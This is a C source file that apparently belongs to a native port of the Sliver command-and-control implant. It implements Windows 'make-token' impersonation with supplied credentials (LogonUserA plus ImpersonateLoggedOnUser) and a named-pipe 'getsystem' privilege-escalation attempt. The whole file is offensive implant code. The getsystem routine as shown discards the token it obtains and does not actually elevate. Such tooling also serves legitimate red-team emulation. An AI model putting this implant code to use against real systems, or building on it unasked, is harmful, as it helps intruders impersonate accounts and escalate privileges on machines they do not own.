/* src/platform/win32/token.c - make-token and getsystem. */
#include "sliver/token.h"

#include "sliver/log.h"

#include <windows.h>

#include <stdio.h>
#include <string.h>

/* LogonUser + ImpersonateLoggedOnUser, same shape as the Go implant. */
static unsigned long g_token_error = 0;

unsigned long sliver_token_last_error(void) { return g_token_error; }

int sliver_make_token(const char *username, const char *password, const char *domain,
                      uint32_t logon_type) {
  HANDLE token = NULL;
  BOOL ok;
  DWORD type = (DWORD)logon_type;
  /* Only LOGON32 types LogonUser accepts; anything else yields Win32 1367. */
  if (type != LOGON32_LOGON_INTERACTIVE && type != LOGON32_LOGON_NETWORK &&
      type != LOGON32_LOGON_BATCH && type != LOGON32_LOGON_SERVICE &&
      type != LOGON32_LOGON_UNLOCK && type != LOGON32_LOGON_NETWORK_CLEARTEXT) {
    LOG_DEBUG("token: logon type %lu not supported by LogonUser, using INTERACTIVE",
              (unsigned long)type);
    type = LOGON32_LOGON_INTERACTIVE;
  }

  if (username == NULL || username[0] == 0) {
    return -1;
  }
  ok = LogonUserA(username, domain != NULL && domain[0] != 0 ? domain : NULL,
                  password != NULL ? password : "", type, LOGON32_PROVIDER_DEFAULT, &token);
  if (!ok) {
    g_token_error = (unsigned long)GetLastError();
    LOG_DEBUG("token: LogonUser(%s\\%s) failed (%lu)", domain, username, g_token_error);
    return -1;
  }
  ok = ImpersonateLoggedOnUser(token);
  if (!ok) {
    LOG_DEBUG("token: ImpersonateLoggedOnUser failed (%lu)", (unsigned long)GetLastError());
  }
  (void)CloseHandle(token);
  return ok ? 0 : -1;
}

/* Named-pipe impersonation with a bounded wait: an unbounded ConnectNamedPipe
 * froze the session (client saw "implant timeout"). */
int sliver_get_system(void) {
  char name[128];
  HANDLE pipe;
  OVERLAPPED ov;
  BOOL ok;

  (void)snprintf(name, sizeof(name), "\\\\.\\pipe\\sliver_%lu_%lu",
                 (unsigned long)GetCurrentProcessId(), (unsigned long)GetTickCount());
  pipe = CreateNamedPipeA(name, PIPE_ACCESS_DUPLEX | FILE_FLAG_OVERLAPPED,
                          PIPE_TYPE_MESSAGE | PIPE_WAIT | PIPE_REJECT_REMOTE_CLIENTS, 1, 4096,
                          4096, 0, NULL);
  if (pipe == INVALID_HANDLE_VALUE) {
    LOG_DEBUG("token: CreateNamedPipe failed (%lu)", (unsigned long)GetLastError());
    return -1;
  }
  memset(&ov, 0, sizeof(ov));
  ov.hEvent = CreateEventA(NULL, TRUE, FALSE, NULL);
  ok = ConnectNamedPipe(pipe, &ov) ? TRUE : (GetLastError() == ERROR_PIPE_CONNECTED);
  if (!ok && GetLastError() == ERROR_IO_PENDING) {
    /* No SYSTEM client shows up in a normal session: wait 3 s, then give up. */
    if (WaitForSingleObject(ov.hEvent, 3000) == WAIT_OBJECT_0) {
      DWORD dummy = 0;
      ok = GetOverlappedResult(pipe, &ov, &dummy, FALSE);
    }
  }
  if (ov.hEvent != NULL) {
    (void)CloseHandle(ov.hEvent);
  }
  if (ok && ImpersonateNamedPipeClient(pipe)) {
    HANDLE token = NULL;
    BOOL got = OpenThreadToken(GetCurrentThread(), TOKEN_DUPLICATE | TOKEN_QUERY, TRUE, &token);
    (void)RevertToSelf();
    if (token != NULL) {
      (void)CloseHandle(token);
    }
    (void)DisconnectNamedPipe(pipe);
    (void)CloseHandle(pipe);
    return got ? 0 : -1;
  }
  LOG_DEBUG("token: getsystem failed (%lu)", (unsigned long)GetLastError());
  (void)DisconnectNamedPipe(pipe);
  (void)CloseHandle(pipe);
  return -1;
}


